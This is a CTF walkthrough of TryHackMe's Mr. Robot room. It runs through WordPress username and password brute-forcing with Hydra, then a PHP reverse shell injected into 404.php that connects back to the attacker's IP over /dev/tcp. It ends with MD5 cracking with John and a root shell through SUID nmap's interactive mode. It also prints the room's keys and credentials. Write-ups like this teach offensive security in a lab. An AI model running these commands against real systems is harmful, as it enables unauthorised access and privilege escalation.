---
title: "Mr. Robot CTF - TryHackMe (Medium)"
description: "Classic training machine on TryHackMe covering the full pentesting cycle: reconnaissance, directory brute forcing, SMB enumeration, SSH brute force, and working with encrypted keys"
image: "/images/neighbour_thm/thm_main.png"
date: "2026-04-26"
platform: "thm"
---

## Introduction

**Mr. Robot CTF** is one of the most popular rooms on TryHackMe. The goal is to find three hidden keys on a real vulnerable machine.

The attack chain covers robots.txt, WordPress brute-forcing via Hydra, injecting a PHP reverse shell through the theme editor, cracking an MD5 hash with John, and privilege escalation through a vulnerable SUID version of nmap.

| Parameter | Value |
| --- | --- |
| Platform | TryHackMe |
| Difficulty | Medium |
| Target IP | 10.113.172.127 |
| Attacker IP | 192.168.146.153 (tun0) |
| Goal | Find three keys |

---

## Attack Chain

```
robots.txt → Key 1 + wordlist
    → Gobuster → /wp-admin
        → Hydra (username) → Elliot
            → Hydra (password) → ER28-0652
                → WordPress Theme Editor → PHP reverse shell
                    → /home/robot/password.raw-md5
                        → John the Ripper → abcdefghijklmnopqrstuvwxyz
                            → su robot → Key 2
                                → find SUID nmap
                                    → nmap --interactive → !sh → root → Key 3
```

---

## Phase 1. Reconnaissance

### Step 1. Starting the Machine

We launch the target machine through the TryHackMe interface. IP: `10.113.172.127`.

![01_start](/handson/images/mr_robot_thm/01_start.png)

![02_3keys](/handson/images/mr_robot_thm/02_3keys.png)

Three fields for entering keys - each in the format of a 32-character MD5 hash.

### Step 2. Port Scanning - Nmap

```bash
nmap -sC -sV 10.113.172.127
```

![04_nmap](/handson/images/mr_robot_thm/04_nmap.png)

| Port | Protocol | Service | Version |
| --- | --- | --- | --- |
| 22/tcp | SSH | OpenSSH | Ubuntu |
| 80/tcp | HTTP | Apache httpd | - |
| 443/tcp | HTTPS | Apache httpd | Self-signed cert from 2015 |

Attack surface: web server and SSH. We start with the web.

### Step 3. Exploring the Website

We open `http://10.113.172.127` - a themed interface in the style of the TV series. Commands `prepare`, `fsociety`, `inform`, `join` — an interactive page with no real functionality.

![05_site](/handson/images/mr_robot_thm/05_site.png)

---

## Phase 2. Key 1 - robots.txt

### Step 4. Checking robots.txt

The first thing to check on any web server - `robots.txt`:

```bash
curl http://10.113.172.127/robots.txt
```

![06_robots](/handson/images/mr_robot_thm/06_robots.png)

```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

Hidden in `robots.txt` are two files: the first key and a wordlist named `fsocity.dic` - a reference to the hacker group fsociety from the TV series.

### Step 5. Downloading the Files

```bash
wget http://10.113.172.127/key-1-of-3.txt
wget http://10.113.172.127/fsocity.dic
cat key-1-of-3.txt
```

![07_wget](/handson/images/mr_robot_thm/07_wget.png)

![08_key_1](/handson/images/mr_robot_thm/08_key_1.png)

**Key 1: `073403c8a58a1f80d943455fb30724b9`**

The wordlist is 6.9 MB - 858,160 lines with a huge number of duplicates.

### Step 6. Cleaning the Wordlist

```bash
sort fsocity.dic | uniq > fsocity_clean.dic
wc -l fsocity_clean.dic
# 11452 lines after deduplication
```

![12_sort](/handson/images/mr_robot_thm/12_sort.png)

After removing duplicates - 11,452 unique lines. Brute-forcing will be 75 times faster.

---

## Phase 3. WordPress - Brute-Forcing Login and Password

### Step 7. Directory Enumeration - Gobuster

```bash
gobuster dir -e -u http://10.113.172.127 -w /usr/share/wordlists/dirb/common.txt
```

![09_gobuster](/handson/images/mr_robot_thm/09_gobuster.png)

Gobuster finds `/wp-admin` with a 302 redirect - the site runs on **WordPress 4.3.1**.

### Step 8. WordPress Login Page

We open `http://10.113.172.127/wp-login.php`:

![10_wp_login](/handson/images/mr_robot_thm/10_wp_login.png)

### Step 9. Brute-Forcing the Username

WordPress returns different error messages for a non-existent user versus a wrong password - this allows enumerating usernames from the wordlist:

```bash
hydra -L fsocity_clean.dic -p test 10.113.172.127 \
    http-post-form \
    "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username" -V
```

![13_hydra](/handson/images/mr_robot_thm/13_hydra.png)

![14_username](/handson/images/mr_robot_thm/14_username.png)

Hydra finds users `elliot`, `Elliot`, `ELLIOT` - all three case variants exist. We use `Elliot`.

### Step 10. Confirming - Wrong Password, Valid Username

We enter `Elliot` with any password:

![15_pass_not_correct](/handson/images/mr_robot_thm/15_pass_not_correct.png)

```
ERROR: The password you entered for the username Elliot is incorrect.
```

WordPress confirms the user exists. We capture the exact error string for the next stage.

### Step 11. Brute-Forcing the Password

```bash
hydra -l Elliot -P fsocity_clean.dic 10.113.172.127 \
    http-post-form \
    "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=The password you entered for the username" -V
```

![16_hydra_pass](/handson/images/mr_robot_thm/16_hydra_pass.png)

![17_pass_found](/handson/images/mr_robot_thm/17_pass_found.png)

```
[80][http-post-form] host: 10.113.172.127  login: Elliot  password: ER28-0652
1 of 1 target successfully completed, 1 valid password found
```

**Credentials: `Elliot : ER28-0652`**

### Step 12. Logging into WordPress

![18_dashboard](/handson/images/mr_robot_thm/18_dashboard.png)

WordPress 4.3.1 admin dashboard. Theme - Twenty Fifteen. Full administrative access.

---

## Phase 4. PHP Reverse Shell — Gaining Server Access

### Step 13. Starting a Listener on the Attack Machine

```bash
rlwrap nc -lvnp 4444
```

![19_start_listening](/handson/images/mr_robot_thm/19_start_listening.png)

```
Listening on 0.0.0.0 4444
```

### Step 14. Getting Our IP Address

```bash
ip addr show tun0
```

![20_my_ip](/handson/images/mr_robot_thm/20_my_ip.png)

Attacker IP in the TryHackMe VPN: `192.168.146.153`

### Step 15. Injecting a Reverse Shell via Theme Editor

In WordPress: **Appearance → Theme Editor → 404 Template (404.php)**

We replace the entire file contents with:

```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.146.153/4444 0>&1'");
?>
```

![21_php](/handson/images/mr_robot_thm/21_php.png)

In the **Twenty Fifteen** theme the file `404.php` is open. The PHP code, when executed, will open a bash connection back to the attacker's machine over TCP on port 4444. We click **Update File**.

We activate the shell by visiting any non-existent page:

```
http://10.113.172.127/anything_that_doesnt_exist
```

### Step 16. Receiving the Shell and Upgrading It

![23_success](/handson/images/mr_robot_thm/23_success.png)

```
Connection received on 10.113.172.127 33078
daemon@ip-10-113-172-127:/opt/bitnami/apps/wordpress/htdocs$
```

We upgrade the raw shell to an interactive one:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

![24_reverse](/handson/images/mr_robot_thm/24_reverse.png)

The shell is now fully interactive - arrow keys, Tab completion, and `clear` all work.

---

## Phase 5. Key 2 - Cracking the Password Hash

### Step 17. Exploring /home/robot

```bash
cd /home
ls
cd robot
ls -la
cat key-2-of-3.txt   # Permission denied
```

![25_permission](/handson/images/mr_robot_thm/25_permission.png)

`key-2-of-3.txt` belongs to user `robot` - we are running as `daemon`, no access. But next to it is a file named `password.raw-md5`.

### Step 18. Reading the Password Hash

```bash
cat password.raw-md5
```

![26_raw_md5](/handson/images/mr_robot_thm/26_raw_md5.png)

```
robot:c3fcd3d76192e4007dfb496cca67e13b
```

An MD5 hash of user `robot`'s password. We copy it to the attack machine.

### Step 19. Cracking MD5 with John the Ripper

On the attack machine:

```bash
echo "c3fcd3d76192e4007dfb496cca67e13b" > robot_hash.txt
john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt robot_hash.txt
```

![27_for_john](/handson/images/mr_robot_thm/27_for_john.png)

![28_john](/handson/images/mr_robot_thm/28_john.png)

```
abcdefghijklmnopqrstuvwxyz   (robot_hash.txt)
Speed: 4070K p/s - cracked instantly
```

The password is the entire Latin alphabet in order. The weakest possible password.

### Step 20. Switching to robot and Reading the Key

```bash
su robot
# password: abcdefghijklmnopqrstuvwxyz
cat key-2-of-3.txt
```

![29_key_2](/handson/images/mr_robot_thm/29_key_2.png)

**Key 2: `822c73956184f694993bede3eb39f959`**

---

## Phase 6. Key 3 - Privilege Escalation via SUID nmap

### Step 21. Finding SUID Files

```bash
find / -perm -4000 2>/dev/null
```

![30_find](/handson/images/mr_robot_thm/30_find.png)

In the SUID file list - `/usr/local/bin/nmap`. A non-standard path and a non-standard version. This is an old version of nmap that supports `--interactive` mode.

### Step 22. Exploiting SUID nmap

```bash
/usr/local/bin/nmap --interactive
```

In interactive mode nmap allows executing shell commands:

```
nmap> !sh
```

The shell launches with the file owner's privileges - root (because of SUID).

```bash
whoami   # root
cd /root
ls
cat key-3-of-3.txt
```

![31_key_3](/handson/images/mr_robot_thm/31_key_3.png)

**Key 3: `04787ddef27c3dee1ee161b21670b4e4`**

![32_the_end](/handson/images/mr_robot_thm/32_the_end.png)

---

## Summary and Conclusions

### Complete Attack Chain

| Phase | Tool | Action | Result |
| --- | --- | --- | --- |
| Reconnaissance | Nmap | Port scanning | Ports 80, 443, 22 |
| Web recon | robots.txt | Reading disallowed paths | Key 1 + wordlist |
| Directory enumeration | Gobuster | Finding hidden paths | `/wp-admin` |
| Username brute-force | Hydra | Enumerating users | `Elliot` |
| Password brute-force | Hydra | Dictionary attack | `ER28-0652` |
| Exploitation | WordPress Theme Editor | Injecting PHP shell | Reverse shell as daemon |
| Post-exploitation | Manual file search | Reading sensitive files | robot's MD5 hash |
| Hash cracking | John the Ripper | Dictionary attack | `abcdefghijklmnopqrstuvwxyz` |
| Lateral movement | su robot | Switching user | Key 2 |
| Privilege escalation | SUID nmap | `--interactive` + `!sh` | Root shell |
| Final | cat | Reading Key 3 | Key 3 |

### Why This Worked

**robots.txt as reconnaissance** - the file is intended for search engine bots but contained direct links to secret files. In real systems robots.txt often exposes hidden paths.

**Different WordPress error messages** - the ability to distinguish "user does not exist" from "wrong password" enabled a two-stage brute-force: first the username, then the password.

**Theme Editor with no restrictions** - access to the PHP theme file editor is equivalent to RCE (Remote Code Execution). WordPress admin = potential RCE.

**MD5 without salt** - the password was stored as `MD5(password)` with no random salt. A dictionary attack through John cracked it instantly.

**SUID on old nmap** - interactive mode in nmap versions below 5.x allows executing arbitrary commands. SUID + outdated software = privileged shell.
